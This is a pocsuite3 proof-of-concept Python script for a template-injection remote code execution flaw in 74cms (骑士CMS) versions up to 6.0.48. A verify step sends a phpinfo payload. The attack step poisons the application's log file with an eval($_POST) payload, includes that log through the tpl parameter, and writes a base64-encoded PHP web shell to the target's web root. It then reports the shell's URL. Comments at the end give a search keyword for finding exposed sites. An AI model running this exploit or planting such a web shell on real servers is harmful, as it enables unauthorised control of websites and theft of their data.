from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder

import time

class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = 'midi'  # PoC 的作者
    vulDate = '2021-7-02'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-2-02'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-2-02'  # PoC 更新日期 (%Y-%m-%d)
    references = []  # 漏洞来源地址，0day 不用写
    name = '骑士CMS 6.0.20版本 前台RCE'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'http://www.74cms.com/'  # 漏洞厂商主页地址
    appName = '骑士CMS'  # 漏洞应用名称
    appVersion = '<=6.0.48'  # 漏洞影响版本
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '/Application/Common/Controller/BaseController.class.php文件的assign_resume_tpl函数因为过滤不严格，导致了模板注入，可以进行远程命令执行'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = ''''''

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}
        # payload = "path={0}".format(self.get_option("username"))
        payload2 = "/index.php?m=home&a=assign_resume_tpl"
        data = {
            "tpl": """<?php phpinfo();ob_flush();?>/r/n<qscms/company_show h="info" id="$_GET['id']"/>""",
            "variable" : "1"
        }
        resp = requests.post(self.url+payload2, data=data)

        if resp.status_code == 404 and ("""href="http://www.thinkphp.cn">ThinkPHP""" in resp.text or "<h1>页面错误！请稍后再试～</h1>" in resp.text):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Referer'] = payload2
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = dict()
        s = requests.session()

        filename = random_str(6) + ".php"
        php_code1 = "eval($_POST[midi]);"
        php_code = "file_put_contents('{}',base64_decode('aGFwcHkgZGF5PD9waHAgZXZhbCgkX1BPU1RbbWlkaV0pOyA/Pg=='));".format(filename)
        payload = {
            "tpl": """<?php eval($_POST[midi]); ob_flush();?>/r/n<qscms/company_show h="info" id="$_GET['id']"/>""".format(php_code1),
            "variable" : "1"
        }
        times = time.time()
        local_time = time.localtime(times)
        t = time.strftime("%Y %m %d", local_time)
        tl = t.split(" ")
        s.post(url=self.url + "/index.php?m=home&a=assign_resume_tpl", data=payload)
        payload2 = {
            "tpl": """./data/Runtime/Logs/Home/{}_{}_{}.log""".format(tl[0][-2:], tl[1], tl[2]),
            "variable" : "1",
            "midi": "{}".format(php_code)
        }

        s.post(url=self.url + "/index.php?m=home&a=assign_resume_tpl", data=payload2)
        # print(self.url + "/" + filename)
        # print(requests.get(url=self.url + "/" + filename).text)
        if "happy day" in requests.get(url=self.url + "/" + filename).text:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + "/" + filename
            result['ShellInfo']['Content'] = '<?php echo "happy day";@eval($_POST["midi"]);?>'

        return self.parse_output(result)


register_poc(DemoPOC)
# keyword : 欢迎登录骑士人才系统！请 登录 或 免费注册
# 骑士CMS是基于PHP+MYSQL的免费网站管理系统,提供完善的人才招聘网站建设方案
# 骑士人才系统PHP高端人才系统(www.74cms.com)